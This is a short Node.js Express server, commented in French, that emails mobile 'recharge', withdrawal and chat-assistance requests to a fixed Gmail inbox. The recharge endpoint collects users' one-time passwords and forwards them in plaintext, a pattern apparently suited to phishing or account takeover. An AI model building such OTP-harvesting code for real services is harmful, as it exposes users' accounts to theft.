const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();
const PORT = 3000;

app.use(bodyParser.json());

// --- Configurer ton compte Gmail
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "manager.building26@gmail.com", // ton email
        pass: "ton_app_password_ici" // mot de passe application Gmail
    }
});

// --- Endpoint pour envoyer mail pour recharge
app.post("/send-recharge-mail", (req,res)=>{
    const {numero,montant,otp} = req.body;
    const mailOptions = {
        from: "manager.building26@gmail.com",
        to: "manager.building26@gmail.com",
        subject: "Nouvelle demande de recharge",
        text: `Numéro: ${numero}\nMontant: ${montant}\nOTP: ${otp}`
    };
    transporter.sendMail(mailOptions,(err,info)=>{
        if(err) return res.status(500).send(err);
        res.send("Mail envoyé avec succès");
    });
});

// --- Endpoint pour envoyer mail pour retrait
app.post("/send-retrait-mail", (req,res)=>{
    const {numero,nom,montant} = req.body;
    const mailOptions = {
        from: "manager.building26@gmail.com",
        to: "manager.building26@gmail.com",
        subject: "Nouvelle demande de retrait",
        text: `Numéro: ${numero}\nNom du compte: ${nom}\nMontant: ${montant}`
    };
    transporter.sendMail(mailOptions,(err,info)=>{
        if(err) return res.status(500).send(err);
        res.send("Mail envoyé avec succès");
    });
});

// --- Endpoint pour envoyer question du chat IA
app.post("/send-assist-mail",(req,res)=>{
    const {question,user} = req.body;
    const mailOptions = {
        from: "manager.building26@gmail.com",
        to: "manager.building26@gmail.com",
        subject: "Nouvelle question Assistance IA",
        text: `Utilisateur: ${user}\nQuestion: ${question}`
    };
    transporter.sendMail(mailOptions,(err,info)=>{
        if(err) return res.status(500).send(err);
        res.send("Question envoyée au manager");
    });
});

// --- Lancer le serveur
app.listen(PORT,()=>{
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
});